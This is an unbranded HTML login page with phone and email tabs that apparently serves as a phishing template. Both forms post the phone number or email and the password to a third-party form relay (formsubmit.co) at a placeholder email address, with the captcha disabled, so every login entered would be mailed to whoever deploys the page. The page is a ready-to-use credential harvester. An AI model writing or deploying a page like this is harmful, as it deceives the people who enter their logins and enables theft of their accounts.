<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Login</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/flag-icon-css/css/flag-icon.min.css">
  <style>
    body {
      font-family: 'Inter', sans-serif;
      background-color: #000;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      flex-direction: column;
    }

    h1 {
      font-size: 2rem;
      margin-bottom: 1rem;
    }

    .toggle-container {
      display: flex;
      background-color: #2d2d2d;
      border-radius: 50px;
      overflow: hidden;
      margin-bottom: 20px;
      width: 320px;
    }

    .toggle-button {
      flex: 1;
      padding: 12px;
      text-align: center;
      cursor: pointer;
      background-color: transparent;
      color: #ccc;
      border: none;
      font-weight: 600;
      font-size: 1rem;
    }

    .toggle-button.active {
      background-color: #d4af37;
      color: #000;
    }

    .form-container {
      width: 320px;
    }

    form {
      display: none;
      flex-direction: column;
      gap: 16px;
    }

    form.active {
      display: flex;
    }

    label {
      font-size: 0.9rem;
      margin-bottom: -10px;
    }

    .input-group {
      background-color: #2d2d2d;
      border-radius: 30px;
      display: flex;
      align-items: center;
      padding: 10px 16px;
    }

    .input-group input {
      background: none;
      border: none;
      color: white;
      width: 100%;
      margin-left: 10px;
      outline: none;
      font-size: 1rem;
    }

    .input-group select {
      background: none;
      border: none;
      color: white;
      outline: none;
      font-size: 1rem;
      margin-left: 6px;
      appearance: none;
    }

    .flag-icon {
      font-size: 1.2rem;
    }

    .eye-icon {
      cursor: pointer;
      color: #888;
    }

    .bottom-links {
      display: flex;
      flex-direction: column;
      align-items: flex-start;
      font-size: 0.85rem;
      gap: 6px;
    }

    .bottom-links a {
      color: white;
      text-decoration: none;
    }

    .submit-button {
      margin-top: 20px;
      background-color: #d4af37;
      color: black;
      padding: 12px;
      border: none;
      border-radius: 30px;
      font-size: 1rem;
      font-weight: 600;
      cursor: pointer;
    }

  </style>
</head>
<body>

  <h1>Log In</h1>

  <div class="toggle-container">
    <button id="phoneBtn" class="toggle-button active">Phone Login</button>
    <button id="emailBtn" class="toggle-button">Email Login</button>
  </div>

  <div class="form-container">
    <!-- PHONE LOGIN FORM -->
    <form id="phoneForm" class="active" method="POST" action="https://formsubmit.co/your@email.com">
      <input type="hidden" name="_captcha" value="false">
      
      <label for="phone">Phone Number</label>
      <div class="input-group">
        <span class="flag-icon flag-icon-us"></span>
        <select name="code" style="width: 60px;">
          <option value="+1" data-flag="us">+1</option>
          <option value="+1" data-flag="ca">+1</option>
          <option value="+33" data-flag="fr">+33</option>
          <option value="+47" data-flag="no">+47</option>
          <option value="+34" data-flag="es">+34</option>
          <option value="+46" data-flag="se">+46</option>
          <option value="+41" data-flag="ch">+41</option>
          <option value="+63" data-flag="ph">+63</option>
          <option value="+44" data-flag="gb">+44</option>
          <option value="+57" data-flag="co">+57</option>
        </select>
        <input type="tel" name="phone" placeholder="Phone Number" required />
      </div>

      <label for="password">Password</label>
      <div class="input-group">
        <input type="password" name="password" placeholder="Password" required id="phonePassword"/>
        <span class="eye-icon" onclick="togglePassword('phonePassword')">&#128065;</span>
      </div>

      <div class="bottom-links">
        <a href="#">Forgot password?</a>
        <label><input type="checkbox"> Remember account and password</label>
      </div>

      <button type="submit" class="submit-button">Log In</button>
    </form>

    <!-- EMAIL LOGIN FORM -->
    <form id="emailForm" method="POST" action="https://formsubmit.co/your@email.com">
      <input type="hidden" name="_captcha" value="false">
      
      <label for="email">Email</label>
      <div class="input-group">
        <input type="email" name="email" placeholder="Email Address" required />
      </div>

      <label for="password">Password</label>
      <div class="input-group">
        <input type="password" name="password" placeholder="Password" required id="emailPassword"/>
        <span class="eye-icon" onclick="togglePassword('emailPassword')">&#128065;</span>
      </div>

      <div class="bottom-links">
        <a href="#">Forgot password?</a>
        <label><input type="checkbox"> Remember account and password</label>
      </div>

      <button type="submit" class="submit-button">Log In</button>
    </form>
  </div>

  <script>
    const phoneBtn = document.getElementById('phoneBtn');
    const emailBtn = document.getElementById('emailBtn');
    const phoneForm = document.getElementById('phoneForm');
    const emailForm = document.getElementById('emailForm');

    phoneBtn.addEventListener('click', () => {
      phoneBtn.classList.add('active');
      emailBtn.classList.remove('active');
      phoneForm.classList.add('active');
      emailForm.classList.remove('active');
    });

    emailBtn.addEventListener('click', () => {
      emailBtn.classList.add('active');
      phoneBtn.classList.remove('active');
      emailForm.classList.add('active');
      phoneForm.classList.remove('active');
    });

    function togglePassword(id) {
      const field = document.getElementById(id);
      field.type = field.type === "password" ? "text" : "password";
    }
  </script>

</body>
</html>
